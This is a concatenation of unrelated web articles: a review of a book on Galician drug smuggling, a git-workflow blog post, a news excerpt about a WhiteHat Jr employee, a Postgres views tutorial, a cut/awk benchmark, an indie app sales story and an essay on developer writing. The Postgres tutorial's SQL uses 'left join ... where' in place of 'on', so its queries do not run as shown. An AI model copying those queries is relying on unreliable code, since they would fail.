Hashish smuggling quickly became cocaine.</p><p> However it happened, smugglers made the transition quickly. When the Medellín cartel spent some time in Galicia in exile they realized that there was an ideal infrastructure for them to use. They built this trade from the ready-made scaffolding of the tobacco trade. Clan bosses like Sito Miñanco took the speedboats they had running crates of smoke up and down the Arousa river and loaded them with blow.&nbsp;</p></div><p>The Medellín cartel had come to Galica because they were feeling some heat from the DEA in bringing drugs into the U.S. (never if it went at cross measures with the goals of the CIA, of course, as McCoy shows in his book), and they needed new markets. McCoy’s law of narcotics as commodities seeking to be sold held true. Europe in the 80s was the perfect logical next step. Not only did they have the skilled talent they needed, but the Galicians spoke their language. And the government tied its own hands to stop it thanks to their numerous corrupt connections.</p><p>This is the more interesting story that I wish the book had told, as well as delving deeper into the politics of the trade. Why did Galician politicians allow the smuggling culture to take hold? Carretero mentions that a factor in the government finally taking action was the support for interdiction of the trade by Socialist Party (PSOE) politicians, like Felipe González, who was Prime Minister of the country from 1982-1996. It was within this time period that the first blow against the smugglers came, with the ‘macro-indictment’ of 1984. This was the first coordinated strike against the whole of the smugglers and their network, rather than limited and ineffective isolated enforcement. Carretero credits the limited success of this action (nobody went down hard, though it did create a new state of affairs where the smugglers had to tread more cautiously and not so out in the open as they had before) to it having the support of a Virginio Fuentes. Fuentes was the socialist governor of Pontevedra, ‘one of the few in Galician politics to raise his voice against the smugglers.’ Carretero attributes this to Fuentes following the cue of González; he ‘sensed a potential vote-winner in taking a stand against smuggling.’</p><p>But Carretero also mentions a murkier story that would have merited closer scrutiny (or more realistically its own book). He relates an anecdote from Fernando Rodríguez Mondragón’s book <em>El hijo del ‘Ajedrecista’ </em>(The ‘Chess Player's’ Son). That chess player was Gilberto Rodríguez Orejuela, who was the boss of the Cali cartel – the cartel that shipped the cocaine over the Atlantic to Galicia. Orejuela was in Spain following a crackdown in Colombia by the President Belisario Betancur on the narcos, but he had been scooped up in November of ‘84 in Spain along with an account book of his detailing millions of dollars in transactions for the cartel. The DEA wanted Orejuela extradited to America, but after two years of jockeying and negotiation, Orejuela and the Colombians were sent back to Colombia. They spent just months in prison before getting out, while in America they could have expected 10-15-year prison sentences.</p><p>Mondragón says in his book that the reason for these reduced sentences came to Spain on Pablo Escobar’s private jet. And there were twenty million of these reasons. $5 million went to Felipe González, ‘his negotiators said there was an election coming up and they needed the money.’ $10 million went to the <em>Audiencia Nacional</em>, ‘the High Court in Spain with jurisdiction over international crimes.’ Carretero doesn’t dig any deeper into these explosive allegations, wrapping up tersely that ‘these claims remain unsubstantiated.’ But having questions like these answered would go a long way in understanding how exactly the drug trade was tolerated by the Spanish government.&nbsp;</p><p>McCoy notes that ‘the CIA’s Cold War alliances with drug lords ... created enforcement-free zones closed to outside investigation.’ How this worked was simple, ‘the DEA deferred to the CIA during the Cold War whenever covert operations became intertwined in the drug trade…’ Its links to the Medellín cartel, which Pablo Escobar founded, are documented as well. ‘All major U.S. agencies,’ writes McCoy, ‘have gone on the record stating, with varying degrees of frankness, that the Medellín cartel used contra forces to smuggle cocaine into the …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><p>I find it challenging to keep commits consistent and perfectly segmented. My original reasoning was a lack of discipline on my end. But over time, I discovered that I am the majority. My new conclusion is it's not me. It's git's fault.</p><p>Human brains function in vastly different ways among the population. Some are logical; some are sensitive, and some are more organised than others. <del>Astrology can explain it all</del>. The two forms of thinking that are related to this topic is <a href="https://en.wikipedia.org/wiki/Divergent_thinking">divergent thinking</a> and <a href="https://en.wikipedia.org/wiki/Convergent_thinking">convergent thinking</a>. If you are more of a divergent thinker, you might find ideas popping up in your head constantly (which is pretty annoying sometimes). That's because your brain works by association more. Input from the world, in the case of writing code, is mostly the existing codebase, combined with your past experiences with previous projects, which will generate ideas of how to solve your current tasks. And ideas will trigger more thoughts in a chaining fashion. That's why I often find myself ending up in a place that's nothing to do with the original task. And it's often too late when I realised that (i.e. progress has been made, but not finished). Sometimes there were multiple jumps. When I finish all the bits I started, that's when the biggest problem of the whole work comes in: writing a commit message. Here is an example of a very common commit message in my works.</p><pre><code>fix issue #45

- add [aaa] support
- improve ergonomics of API [bbb]
- refactor [ccc] to [ddd] so that it fits in the eco-system
- oh, package X just became multiple sub packages, we have an eco-system now</code></pre><div><h2>Solutions and Their Problems</h2><p>I have made numerous attempts to improve the situation. Most of the ideas are from "industry best practices".</p><div><h3>create branches for everything</h3><p>This idea came early. Branching makes sense when you work with other people because you are working in parallel. Merging code and resolve conflicts is worth the effort in that scenario. You get the cost back easily from the progress gain due to parallelisation of your work. But it falls apart when the scope is about you and your thoughts. Yes, you are generating more ideas then you physically can keep up with your code, but you are still single-threaded processor. Merging old branches is not a fun activity.</p></div><div><h3>commit often</h3><p>I mean like very often! It's always a good idea to follow the first principle in any engineering problems. Breaking things down into atomic pieces and commit frequently is a sound solution. You also have the benefit of being able to revert specific changes quickly since they are small(er) and (more) atomic. I tried this for a while. The trick is to build up a habit of recognising boundaries and commit without procrastination. In practice, though, I find myself, more often than I would like to, going back changing the git history just to align with the principle. Maybe I should just accept that nobody is perfect, it's okay to mess things up from time to time. But that really demotivate me to keep doing it. Also, I have to constantly be aware of the situation at hand. That's extra brain energy I don't want to waste during heavy works.</p></div></div><div><h2>My Current Solution</h2><p>It's not a solution per se; it's more of a compromise. (Well, isn't that the nature of life 😉?) Or you can say I don't have a solution yet, and I am getting by with it.</p><div><h3>breaking things down (or I try to)</h3><p>I try to break things down to manageable size and commit as soon as the progress is granular. Sometimes it might be an entirely different task I was set out to do because of my divergent thinking nature.</p></div><div><h3>keep track of everthing going on in my brain efficiently</h3><p>I use one <a href="https://orgmode.org/">org-mode</a> file (it's a plain text format for keeping notes and todo lists, you can use whatever works for you, even multiple apps) per project to document my thoughts, ideas, review them regularly, transform them into tasks, and document the progress. I try to keep the file with the repo, but sometimes I don't necessarily want to share my thought process with others, say a work-related repo, or an open-source one. Then it goes into my own knowledge base.</p></div><div><h3>be stingy about branching</h3><p>I know one of the biggest selling points of git is: branching is cheap. It depends on the reason for branching, as I described above. It is definitely not cheap in solo scenarios. So I only create branches when:</p><ul><li>It's the start of a new era. E.g. orgajs v1.0 -&gt; v2.0. The whole thing will be gutted and refactored to death and brought back to life stronger.</li><li>work with other people, of course. But when it's only me left in the conversation, I keep only one branch at a time. Context switching between multiple branches cost energy. Unless something urgent comes up, I normally don't do time-sharing based multitasking.</li></ul></div></div><div><h2>Conclusion</h2><p>Hopefully, my story can help you optimise your productivity. Even if it doesn't work for you, I hope you can at least have one take away from it: don't try too hard to fit yourself into squares that others created, or feel bad when the "best practice" doesn't work for you, as long it gets the job done, your way is the best way.</p></div></div></div></section></div>]]>

<p>Shaarif Ansari got the call on 11 November at around 9 in the morning. On the phone was a police officer from Powai police station, in the suburbs of Mumbai. “Ansari please come to the police station,” said the officer. “We have received a complaint from your employer WhiteHat Jr. The company officials are here at the station already. We are waiting for you.”&nbsp;</p>


<p>Ansari was taken aback. It is not everyday that you have a police officer call you. Almost immediately he clarified that he did not work at WhiteHat Jr anymore. That he was fired by the company in the first week of September and had had no contact with them since, so what was all this about? The person was in no mood to explain or chat. He cut Ansari off, and asked him to turn up at the station immediately. Caught completely by surprise and with no idea about what was in store for him, Ansari said he was on his way.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>A quick summary of Postgres views, materialized views, and why you should use them.</p><h3>What is a View?</h3><p>A <a href="https://www.postgresql.org/docs/12/sql-createview.html" target="_blank" rel="noopener noreferrer">view</a> is a convenient shortcut to a query. Creating a view does not involve new tables or data. When run, an underlying query is executed, returning its results to the user.</p><h4>Basic Example</h4><p>Say we have the following tables from a database of a university:</p><p><strong>students</strong></p><table><thead><tr><th>id</th><th>name</th><th>type</th></tr></thead><tbody><tr><td>1</td><td>Arun</td><td>undergraduate</td></tr><tr><td>2</td><td>Zack</td><td>graduate</td></tr><tr><td>3</td><td>Joy</td><td>graduate</td></tr></tbody></table><p><strong>courses</strong></p><table><thead><tr><th>id</th><th>title</th><th>code</th></tr></thead><tbody><tr><td>1</td><td>Introduction to Postgres</td><td>PG101</td></tr><tr><td>2</td><td>Authentication Theories</td><td>AUTH205</td></tr><tr><td>3</td><td>Fundamentals of Supabase</td><td>SUP412</td></tr></tbody></table><p><strong>grades</strong></p><table><thead><tr><th>id</th><th>student_id</th><th>course_id</th><th>result</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td><td>B+</td></tr><tr><td>2</td><td>1</td><td>3</td><td>A+</td></tr><tr><td>3</td><td>2</td><td>2</td><td>A</td></tr><tr><td>4</td><td>3</td><td>1</td><td>A-</td></tr><tr><td>5</td><td>3</td><td>2</td><td>A</td></tr><tr><td>6</td><td>3</td><td>3</td><td>B-</td></tr></tbody></table><p>Creating a view consisting of all the three tables will look like this:</p><div><div><div><div><p><span>create</span><span> </span><span>view</span><span> transcripts </span><span>as</span><span></span></p><p><span>    </span><span>select</span><span></span></p><p><span>        students</span><span>.</span><span>name</span><span>,</span><span></span></p><p><span>        students</span><span>.</span><span>type</span><span>,</span><span></span></p><p><span>        courses</span><span>.</span><span>title</span><span>,</span><span></span></p><p><span>        courses</span><span>.</span><span>code</span><span>,</span><span></span></p><p><span>        grades</span><span>.</span><span>result</span></p><p><span>    </span><span>from</span><span> grades</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> students </span><span>where</span><span> grades</span><span>.</span><span>student_id </span><span>=</span><span> students</span><span>.</span><span>id</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> courses </span><span>where</span><span> grades</span><span>.</span><span>course_id </span><span>=</span><span> courses</span><span>.</span><span>id</span><span>;</span></p></div></div></div></div><p>Once done, we can now access the underlying query with:</p><div><div><div><div><p><span>select</span><span> </span><span>*</span><span> </span><span>from</span><span> transcripts</span><span>;</span></p></div></div></div></div><p>For additional parameters or options, refer <a href="https://www.postgresql.org/docs/12/sql-createview.html#:~:text=parameters" target="_blank" rel="noopener noreferrer">here</a>.</p><h3>Why should we use Views?</h3><p>Views provide the several benefits:</p><ul><li>Simplicity</li><li>Consistency</li><li>Logical Organization</li><li>Security</li></ul><h4>Simplicity</h4><p>As a query becomes complex it becomes a hassle to call it. Especially when we run it at regularly. In the example above, instead of repeatedly running:</p><div><div><div><div><p><span>select</span><span></span></p><p><span>    students</span><span>.</span><span>name</span><span>,</span><span></span></p><p><span>    students</span><span>.</span><span>type</span><span>,</span><span></span></p><p><span>    courses</span><span>.</span><span>title</span><span>,</span><span></span></p><p><span>    courses</span><span>.</span><span>code</span><span>,</span><span></span></p><p><span>    grades</span><span>.</span><span>result</span></p><p><span></span><span>from</span><span> grades</span></p><p><span></span><span>left</span><span> </span><span>join</span><span> students </span><span>where</span><span> grades</span><span>.</span><span>student_id </span><span>=</span><span> students</span><span>.</span><span>id</span></p><p><span></span><span>left</span><span> </span><span>join</span><span> courses </span><span>where</span><span> grades</span><span>.</span><span>course_id </span><span>=</span><span> courses</span><span>.</span><span>id</span><span>;</span></p></div></div></div></div><p>We can run this instead:</p><div><div><div><div><p><span>select</span><span> </span><span>*</span><span> </span><span>from</span><span> transcripts</span><span>;</span></p></div></div></div></div><p>Additionally, a view behaves like a typical table. We can safely use it in table <code>JOIN</code>s or even create new views using existing views.</p><h4>Consistency</h4><p>Views ensure that the likelihood of mistakes decreases when repeatedly executing a query. In our example above, we may decide that we want to exclude the course <em>Introduction to Postgres</em>. The query would become:</p><div><div><div><div><p><span>select</span><span></span></p><p><span>    students</span><span>.</span><span>name</span><span>,</span><span></span></p><p><span>    students</span><span>.</span><span>type</span><span>,</span><span></span></p><p><span>    courses</span><span>.</span><span>title</span><span>,</span><span></span></p><p><span>    courses</span><span>.</span><span>code</span><span>,</span><span></span></p><p><span>    grades</span><span>.</span><span>result</span></p><p><span></span><span>from</span><span> grades</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> students </span><span>where</span><span> grades</span><span>.</span><span>student_id </span><span>=</span><span> students</span><span>.</span><span>id</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> courses </span><span>where</span><span> grades</span><span>.</span><span>course_id </span><span>=</span><span> courses</span><span>.</span><span>id</span></p><p><span></span><span>where</span><span> courses</span><span>.</span><span>code </span><span>!=</span><span> </span><span>'PG101'</span><span>;</span></p></div></div></div></div><p>Without a view, we would need to go into every dependent query to add the new rule. This would increase in the likelihood of errors and inconsistencies, as well as introducing a lot of effort for a developer. With views, we can alter just the underlying query in the view <strong>transcripts</strong>. The change will be applied to all applications using this view.</p><h4>Logical Organization</h4><p>With views, we can give our query a name. This is extremely useful for teams working with the same database. Instead of guessing what a query is supposed to do, a well-named view can easily explain it. For example, by looking at the name of the view <strong>transcripts</strong>, we can infer that the underlying query might involve the <strong>students</strong>, <strong>courses</strong>, and <strong>grades</strong> tables.</p><h4>Security</h4><p>Views can restrict the amount and type of data presented to a user. Instead of allowing a user direct access to a set of tables, we provide them a view instead. We can prevent them from reading sensitive columns by excluding them from the underlying query.</p><h3>What is a Materialized View?</h3><p>A <a href="https://www.postgresql.org/docs/12/rules-materializedviews.html" target="_blank" rel="noopener noreferrer">materialized view</a> is a form of view but with the added feature of physically storing the results. In subsequent reads of a materialized view, the time taken to return its results would be much faster than a conventional view. This is because the data is readily available for a materialized view while the conventional view executes the underlying query each time it is called.</p><h4>Basic Example</h4><p>Using our example above, a materialized view can be created like this:</p><div><div><div><div><p><span>create</span><span> materialized </span><span>view</span><span> transcripts </span><span>as</span><span></span></p><p><span>    </span><span>select</span><span></span></p><p><span>        students</span><span>.</span><span>name</span><span>,</span><span></span></p><p><span>        students</span><span>.</span><span>type</span><span>,</span><span></span></p><p><span>        courses</span><span>.</span><span>title</span><span>,</span><span></span></p><p><span>        courses</span><span>.</span><span>code</span><span>,</span><span></span></p><p><span>        grades</span><span>.</span><span>result</span></p><p><span>    </span><span>from</span><span> grades</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> students </span><span>where</span><span> grades</span><span>.</span><span>student_id </span><span>=</span><span> students</span><span>.</span><span>id</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> courses </span><span>where</span><span> grades</span><span>.</span><span>course_id </span><span>=</span><span> courses</span><span>.</span><span>id</span><span>;</span></p></div></div></div></div><p>Reading from the materialized view is the same as a conventional view:</p><div><div><div><div><p><span>select</span><span> </span><span>*</span><span> </span><span>from</span><span> transcripts</span><span>;</span></p></div></div></div></div><p>For additional parameters or options, refer <a href="https://www.postgresql.org/docs/12/sql-creatematerializedview.html#:~:text=parameters" target="_blank" rel="noopener noreferrer">here</a>.</p><h4>Refreshing</h4><p>Unfortunately, there is a trade-off - data in materialized views are not always up to date. We need to refresh it regularly to prevent the data from becoming too stale. To do so:</p><div><div><div><div><p><span>refresh materialized </span><span>view</span><span> transcripts</span><span>;</span></p></div></div></div></div><p>It's up to you how regularly refresh your materialized views, and it's probably different for each view depending on its use-case.</p><h3>Materialized views vs Conventional views</h3><p>Materialized views are useful when execution times for queries or views become unbearable or exceed the service level agreements of a business. These could likely occur in views or queries involving multiple tables and millions of rows. When using such a view, however, there should be tolerance towards data being outdated. Some use-cases for materialized views are internal dashboards and analytics.</p><p>Creating a materialized view is not a solution to inefficient queries. You should always seek to optimize a slow running query even if you are implementing a materialized view.</p><h3>Conclusion</h3><p>Postgres views and materialized views are a great way to organize and view results from commonly used queries. Although similar to one another, each has its purpose. Views simplify the process of running queries. Materialized views are usually faster at returning results, with the trade-off of having stale data.</p></section></div>]]>

<br>
<h3>The UNIX philosophy</h3>

<p>
In UNIX, there is (or used to be) a philosophy which, among other things, 
stipulates that a piece of software should do "one thing well". There is 
of course a long-running debate over not only what this really means, 
but also about whether certain programs - if any at all - still adhere 
to this, or ever did.
</p>

<p>
So, we're allegedly in the middle of a dangerous downward spiral of 
constant feature creep and a growing number of command parameters that 
will, eventually, lead to a Grand Unified Program that does everything
poorly (Depending on your personal preference and current mood, replace
the GUP with systemd, Emacs, Windows or Google Chrome as you see fit).
</p>

<p>
I for one find the concept of the UNIX philosophy of doing one thing 
well amicable. I also realize that it is a product of a time when 
computers still mostly passed around text files, and that those text 
files were considered preposterously huge if they exceeded a couple of 
megs in size. Heck, the modern GUI was still a research project at PARC 
when Doug McIlroy wrote the UNIX philosophy down in 1976.
</p>

<h3>Thinkin' 'bout philosophy</h3>
<p>
So, what does it mean to do one thing and do it well? Well, awk has been
a staple of any UNIX diet since the late 1970s. I think it's a lovely
little tool which I use even for rather mundane tasks. It's certainly
changed a bit over the years, but the core concept of the language
remains the same. Still, it's a complete programming language and
can do a lot more than a simple, single-purpose command.
</p>

<p>
The cut command is slightly newer, but like awk, it's a part of the 
POSIX standard. It can also hardly be considered to have suffered much 
feature creep: it's got a rather stringent set of parameters and really 
does just one thing, which is cutting a smaller piece of text out of a 
larger piece of text.
</p>

<p>
The question is of course, does the UNIX philosophy still hold up? Is it always
better to have one small program doing one thing well, as opposed to a
slightly bigger program doing many things? Let's examine this by performing
a simple task with two slightly different twists.
</p>

<h3>Task number one</h3>

<p>
Task number one was to print the second column of a three-column file with
10,000 rows, with a single space separating the columns. This task was
repeated 100 times.
</p>

<p>
<b>cut (GNU coreutils, 43224 bytes)</b>
</p>
<pre>cat cva_in1 | cut -d ' ' -f 2 &gt; /dev/null

real    0m0.297s
user    0m0.288s
sys     0m0.153s
</pre>

<p>
<b>awk (gawk, 658072 bytes)</b>
</p>
<pre>cat cva_in1 | awk '{print $2}' &gt; /dev/null

real    0m0.818s
user    0m0.754s
sys     0m0.232s
</pre>

<p>
<b>Python 3 (Python 3.6, 4526456 bytes + libraries)</b>
<br>
My go-to language for farting around with programming ideas, thus
included for reference. The below two lines of code were written to
a script through which the input was piped and, just as above,
redirected to /dev/null:
</p>
<pre>import sys
for l in sys.stdin: print(l.split()[1])

real    0m5.423s
user    0m4.753s
sys     0m0.873s
</pre>

<p>
As is clearly evident from this highly scientific performance test,
cut is by far the fastest tool for the job. I tried a few different
approaches with Python (such as opening the file from the script
instead of piping it), but they were all similarly slow.
</p>

<h3>Task number two</h3>

<p>
This time, things were spiced up by printing the fifth column in a file 
with unevenly-spaced columns, using the output from "ls -l". The file 
used for testing contained 2235 lines. This task was also repeated 100 
times. Since cut doesn't quite cope with this uneven spacing, we had to 
put the magic of the UNIX philosophy to work using pipes: this time, tr 
was involved as well, stripping away spaces to make each row 
understandable to cut.
</p>

<p>
<b>cut + tr (GNU coreutils, 47288 bytes)</b>
</p>
<pre>cat cva_in2 | tr -s ' ' | cut -d ' ' -f 5 &gt; /dev/null

real    0m0.212s
user    0m0.371s
sys     0m0.138s
</pre>

<p>
<b>awk</b>
</p>
<pre>cat cva_in2 | awk '{print $5}' &gt; /dev/null

real    0m0.460s
user    0m0.379s
sys     0m0.225s
</pre>

<p>
<b>Python 3</b>
</p>

<pre>import sys
for l in sys.stdin: print(l.split()[4])

real    0m4.450s
user    0m3.693s
sys     0m0.934s
</pre>

<p>
Despite the extra pipe, it seems the UNIX philosophy comes out
on top this time as well.
</p>


<h3>A few notes</h3>
<p>
This is of course not an exhaustive test and proves little, if anything 
at all, about he UNIX philosophy. I just wanted to perform a simple test 
with a scenario that at least I have come across many different 
times in many different scripts and many different languages.
</p>

<p>
In a typical daily scenario, I would personally have picked awk for task 
two and saved myself a bit of typing and figuring. This would have made 
no significant impact on perceived performance, because I usually don't 
deal with very large files and in most cases, the time I spend with 
tools I'm less comfortable with far exceeds the time I then spend 
waiting for the script. Still: based on nothing but gut feeling, I 
actually expected awk to be faster or at least comparable for task two. 
So much for my gut.
</p>

<p>
For coping with more complex scenarios without resorting to a language 
proper, more pipes will have to be added and more command line utilities 
will have to be invoked if we want to keep on using tools compliant with 
the UNIX philosophy. This can likely lead to worse performance, but this 
test just goes to show (for the umpteenth time) that the tool we 
instinctively reach for to tackle a task might not be the right one.
</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1605580648658/if0mVXSz_.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>This was a pretty cool milestone to bypass, and certainly with this year getting such a bad rap, at the very least it's proving to be a solid year in terms of side project software sales.</p>
<p>Why did it take so long, couple little nuggets here to chew on for fellow hashnoders.</p>
<h2 id="2014">2014</h2>
<p>Apple released Swift, thought it was cool and set out to build first apps. </p>
<p>I wanted to build games to build something fun so I created a couple different card games for the iPad and also a novel puzzler for iOS. </p>
<p>I had <strong>zero knowledge of marketing</strong>, didn't really think about <strong>WHY</strong> the large global markets would be interested in obscure Finnish card games and overall just did a real rookie job.</p>
<p>I was a decent coder, but I think that's pretty much where it started and ended.</p>
<h2 id="2015-2016">2015-2016</h2>
<p>Not too much activity, kept tinkering with a number of projects but didn't release new significant stuff. </p>
<p>Didn't count the non-published projects that were taken quite far but I'm sure there was many. </p>
<p>What can be learned here? <strong>You can't win if you don't play the game.</strong></p>
<h2 id="2017-2018">2017-2018</h2>
<p>This was the first time I started to see more traction. There were two reasons why this happened.</p>
<ol>
<li><p>I created a couple of games that already had audience (Klondike, Spider and Freecell Solitaire). Games that many people love and will always look to find for their new HW. <strong>In short, launching something with a pre-existing demand</strong>.</p>
</li>
<li><p>I started primarily focusing on the MacOS market. The iOS simple games market is incredible competitive. There are big studios there that pour in big bucks to make really refined experiences and make the games freemium. It's really hard in that environment to be discovered or sell your games for a few bucks. But in the Mac App Store this was possible. In other words, <strong>finding a market with less competition and easier discoverability</strong>.</p>
</li>
</ol>
<p>Still didn't really spend that much time on indie hacking, community building, marketing in general or much else. Just built a few games, put 'em out there and tried to make sure most gamers would be happy with them.</p>
<h2 id="2019">2019</h2>
<p>Quite suddenly and unexpectedly my sales made a huge jump in Q4 2019. Without releasing anything new. What happened? </p>
<p>Apple released macOS Catalina that would not run 32-bit apps anymore. </p>
<p>This meant that <strong>they erased much of the competition</strong> for the card games and all of a sudden more people were looking for these games and had less options to choose from. One would rather excel due to their own great products, but everything counts, right?</p>
<p>At the same time I also knew that I really had to create more something totally different, was simply not interested to put too much effort into this genre anymore.</p>
<h2 id="2020">2020</h2>
<p>The year obviously went haywire from the start and under quarantine I had a chance to finalise and release an app into a totally new genre - productivity. </p>
<p>I created a pretty simple Mac utility  <a target="_blank" href="https://owlocr.com/">OwlOCR</a> and for the first time tried to release in a more sensible way. I published some posts in r/macapps and got phenomenal feedback that really helped improve the app. Super thankful to these early users.</p>
<p>I then launched PH and got a lot of downloads, but less direct feedback. At this point app was still free as I wanted to get some footprint first. </p>
<p>After a few months of totally free, I introduced a premium in-app tier to help with further development. Sales of this tier have been pretty steady and there hasn't been too much negative backlash, as I've kept most features free for all.</p>
<p>This was the first app where I put more effort into the webpage and release efforts, I think next ones should easier as I know a bit more again how to play it.</p>
<p>There's still waaaaayyyyy long way to go before this could be primary source of bread and butter, but the last year has given at least kind of a glimpse of that. </p>
<p>I'm afraid I might need to pivot away from the Mac App Store however, as it opens to iOS apps in the future. At that point I'm afraid it will become as convoluted with big player apps that the indies will be pushed to the sidelines.</p>

<p>I’ve been thinking a lot about writing lately. I recently <a href="https://www.karllhughes.com/posts/cto-writer">left a career as a startup CTO to write full-time</a>, so when people ask me things like, “Why should software engineers know how to write?” I have a lot of thoughts. Rather than write yet another listicle (<a href="https://www.thegraidenetwork.com/blog-all/2017/10/3/why-math-and-science-students-need-writing">1</a>, <a href="https://benmccormick.org/2019/03/02/the-importance-of-writing">2</a>, <a href="https://www.freecodecamp.org/news/why-developers-should-know-how-to-write-dc35aa9b71ab/">3</a>, <a href="https://www.tiny.cloud/blog/developer-blog-writing-social-networks/">4</a>), I am going to boil it down to one simple reason:</p>
<p><strong>You should write to increase your level of influence.</strong></p>
<h2 id="why-influence-matters">Why Influence Matters</h2>
<p>Whether you strive to be promoted within your organization or be fawned over by the coolest tech companies, the fastest path to success is making the right people aware of you. In one of the best essays of career advice for programmers, Patrick McKenzie points out:</p>
<blockquote>
<p>“Most jobs are never available publicly, just like most worthwhile candidates are not available publicly. Information about the position travels at approximately the speed of beer, sometimes lubricated by email.” - <a href="https://www.kalzumeus.com/2011/10/28/dont-call-yourself-a-programmer/">Patrick McKenzie, Don’t Call Yourself a Programmer</a></p>
</blockquote>
<p>Unfortunately, just being the “best” programmer around isn’t going to get you talked about in a bar (and <a href="https://blog.newrelic.com/technology/good-computer-programmer-criteria/">it’s subjective anyway</a>). Ben McCormick points out:</p>
<blockquote>
<p>“Once somebody hits a minimum threshold of technical skill to hold a job in the industry, about 80% of their ability to succeed in Software Development is determined by their communication and people skills, not their technical abilities.” - <a href="https://benmccormick.org/2019/03/02/the-importance-of-writing">Ben McCormick</a></p>
</blockquote>
<p>My experience supports Patrick’s and Ben’s assertions, so now the question is, how can you become one of the people whose name comes up before a job is publicly available?</p>
<p><strong>The right people have to know you. You have to have the right kind of influence.</strong></p>
<h2 id="levels-of-writing-influence">Levels of Writing Influence</h2>
<blockquote>
<p>“The difference between a tolerable programmer and a great programmer is not how many programming languages they know…It’s whether they can communicate their ideas. By persuading other people, they get leverage.” - <a href="https://www.joelonsoftware.com/2005/01/02/advice-for-computer-science-college-students/">Joel Spolsky</a>, Co-founder of StackOverflow</p>
</blockquote>
<p>If you buy my assertion that influence is important in your career as a software developer, the next step is for me to convince you that writing will actually increase your influence. In fact, not all writing will work. The kind of writing you do will make a massive difference on the level and kind of influence you gain.</p>
<p><img src="https://i.imgur.com/KwA6AQe.jpg" alt=""></p>
<p>Let’s take a look at the different levels of influence you can achieve as a software developer and the kinds of writing you need to do to achieve them.</p>
<h3 id="1-willing-participant">1. Willing Participant</h3>
<p>Participants are not influential. They don’t realize it, but they have very little control over their career and are likely to go through a period of unemployment and grueling job interviews every time they need a new job. The only writing a Willing Participant will do is what’s required of them: they’ll respond to Slack messages and emails; they’ll dutifully enter their progress report every day; they might leave a sticky note on someone’s desk (or the digital equivalent) when they want to have a protracted discussion about an issue.</p>
<p>If this is you, don’t be discouraged. We all start our careers as Willing Participants. With <a href="https://www.prnewswire.com/news-releases/harness-2020-state-of-developer-satisfaction-report-shows-impact-of-coronavirus-on-software-development-301119564.html">most software engineering jobs staying remote for the foreseeable future</a>, the minimum level of writing ability is likely to increase, but just checking the box isn’t going to put your name on the tip of your next boss’ tongue.</p>
<h3 id="2-organizational-teacher">2. Organizational Teacher</h3>
<blockquote>
<p>“Every time you find yourself following the manual instead of writing the manual, you’re avoiding the anguish and giving in to the resistance.” - <a href="https://www.amazon.com/dp/B00371V91S/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1">Seth Godin, Linchpin</a></p>
</blockquote>
<p>Most software engineers live in this zone. Organizational Teachers write documentation, technical specifications, style guides, testing criteria, bug reports, and internal knowledge base articles. While this gives you a little influence over how your team (and possibly some adjacent teams) does its job, it’s unlikely that anyone outside your company will hear about your work.</p>
<p>The good thing about being in this zone is that it’s a safe place to practice. Nobody’s going to berate you for your typos (at least, I hope not), and other stakeholders will review most of your writing before it’s made generally available.</p>
<p>The downside to being an Organizational Teacher is that it’s pretty much table stakes for senior engineers. You’re not going to stand out for it, and you probably won’t get your name attached to it (unless it’s buried in your commit history). Hone your writing skills as an Organizational Teacher, and once you feel more comfortable, move up the ladder.</p>
<h3 id="3-organizational-influencer">3. Organizational Influencer</h3>
<p>As you move into an (official or unofficial) leadership role, you’ll start to do more writing at the Organizational Influencer level. This writing includes setting hiring criteria, documenting tradeoffs between complex technical decisions, creating training materials, and setting budgets. These documents will be seen by people above and below your station and will help get you noticed for future promotions.</p>
<p>Many software developers assume that they <em>should not</em> attempt to contribute this kind of writing unless asked. This is incorrect.</p>
<p>For example, if you’re given a new project, you have a professional obligation to report shortcomings in the design. When you report these issues, don’t just write a Slack message, “This won’t work.” <a href="https://melsatar.blog/2017/09/23/trade-off-analysis-technique-make-the-decision-easier/">Document the tradeoffs</a> between the proposed solution and one that you’ve seen work elsewhere. Most people don’t do this because it’s hard, and that’s why they don’t have much influence.</p>
<p>Organizational Influencers are helping set the direction for at least a small part of the business, and they’ll end up doing more writing than those at the previous two levels. Software developers who make it to this level will be eligible for more internal promotions, interesting lateral moves, and a general increase in respect. Organizational Influencers will also start to gain the confidence to start writing externally.</p>
<h3 id="4-external-teacher">4. External Teacher</h3>
<blockquote>
<p>“Writing is hard. People spend their entire lives learning how to write effectively. It isn’t something you can fake. It isn’t something you can buy. You have to work at it.
That’s exactly why people who are afraid they can’t write should be blogging. It’s exercise.” - <a href="https://blog.codinghorror.com/fear-of-writing/">Jeff Atwood</a>, Co-founder of StackOverflow</p>
</blockquote>
<p>Despite the prevalence of <a href="https://medium.com/">Medium</a> and <a href="http://dev.to/">Dev.to</a>, surprisingly few software engineers ever write publicly. External Teachers generally start by writing technical case studies, public documentation, and walkthroughs. This is where software developers can begin to publicly display their knowledge and build a personal brand.</p>
<p>I’ll put a big caveat here and say that writing a few tutorials will not immediately make employers hunt you down. I’ve written dozens of technical tutorials over the years, and only a couple of them led directly to an employment discussion (neither of which worked out). Writing publicly is the first step in building a reputation, but more importantly, it gives you a great resource to point to when an employer asks you about a specific technical experience you’ve had.</p>
<p>The hard part about becoming an External Teacher is that it’s scary, and you’re likely to suck at first. People <a href="https://medium.com/@cinzia.dubois/the-importance-of-doing-things-youre-bad-at-4fcdd4c2fb4b">naturally avoid doing things they’re bad at</a>, but doing scary things is an essential part of gaining influence.</p>
<p>If you overcome the fear of writing publicly and you start to tell people about your writing, you’ll probably be surprised by the encouragement you get. People will root for you when you do something they’re scared to do themselves.</p>
<h3 id="5-external-influencer">5. External Influencer</h3>
